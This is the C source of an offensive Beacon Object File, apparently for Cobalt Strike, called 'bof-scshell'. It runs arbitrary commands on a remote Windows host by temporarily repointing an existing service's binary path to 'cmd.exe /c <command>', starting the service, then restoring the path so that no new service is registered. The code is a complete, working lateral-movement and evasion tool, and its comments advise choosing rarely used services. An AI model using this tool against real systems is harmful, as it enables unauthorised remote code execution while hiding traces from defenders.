/*
 * bof-scshell <host> <service> <command>
 *
 * Fileless remote execution by reconfiguring an existing service's binary
 * path to `cmd.exe /c <command>`, starting it, then restoring the original
 * path.  Nothing new is registered in the SCM.
 *
 * Pick a stopped, rarely used service you can reconfigure (ServiceDll /
 * binPath access).  The original path is restored even if the start fails.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *host, *service, *command;
    int hlen, slen, clen;
    char remote[MAX_PATH], binpath[1024];
    BYTE cfg[4096];
    QUERY_SERVICE_CONFIGA *orig = (QUERY_SERVICE_CONFIGA *)cfg;
    DWORD cfgneed = 0;
    SC_HANDLE scm, svc;
    SERVICE_STATUS st;
    int changed = 0;

    BeaconDataParse(&parser, args, alen);
    host    = BeaconDataExtract(&parser, &hlen);
    service = BeaconDataExtract(&parser, &slen);
    command = BeaconDataExtract(&parser, &clen);
    if (!host || !host[0] || !service || !service[0] || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: scshell <host|.> <service> <command>\n");
        return;
    }

    if (bof_stricmp(host, ".") == 0 || bof_stricmp(host, "localhost") == 0)
        remote[0] = 0;
    else {
        bof_strncpy(remote, "\\\\", sizeof(remote));
        bof_strncat(remote, host, sizeof(remote) - bof_strlen(remote) - 1);
    }

    scm = ADVAPI32$OpenSCManagerA(remote[0] ? remote : NULL, NULL,
                                  SC_MANAGER_CONNECT);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "OpenSCManager failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    svc = ADVAPI32$OpenServiceA(scm, service,
                                SERVICE_CHANGE_CONFIG | SERVICE_START |
                                SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
    if (!svc) {
        BeaconPrintf(CALLBACK_ERROR, "OpenService(%s) failed: %lu\n", service,
                     (unsigned long)KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }

    bof_memzero(cfg, sizeof(cfg));
    if (!ADVAPI32$QueryServiceConfigA(svc, orig, sizeof(cfg), &cfgneed)) {
        BeaconPrintf(CALLBACK_ERROR, "QueryServiceConfig failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(svc);
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] original path: %s\n",
                 orig->lpBinaryPathName ? orig->lpBinaryPathName : "(null)");

    bof_strncpy(binpath, "cmd.exe /c ", sizeof(binpath));
    bof_strncat(binpath, command, sizeof(binpath) - bof_strlen(binpath) - 1);

    if (!ADVAPI32$ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                                       SERVICE_NO_CHANGE, binpath, NULL, NULL,
                                       NULL, NULL, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "ChangeServiceConfig failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(svc);
        ADVAPI32$CloseServiceHandle(scm);
        return;
    }
    changed = 1;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s!%s -> %s\n",
                 host, service, binpath);

    bof_memzero(&st, sizeof(st));
    if (ADVAPI32$StartServiceA(svc, 0, NULL))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] service started\n");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[*] StartService: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());

    KERNEL32$Sleep(3000);
    bof_memzero(&st, sizeof(st));
    if (ADVAPI32$ControlService(svc, SERVICE_CONTROL_STOP, &st))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] service stopped\n");

    if (changed) {
        if (ADVAPI32$ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                                          SERVICE_NO_CHANGE,
                                          orig->lpBinaryPathName, NULL, NULL,
                                          NULL, NULL, NULL, NULL))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] original path restored\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] restore failed: %lu (fix manually!)\n",
                         (unsigned long)KERNEL32$GetLastError());
    }

    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);
}
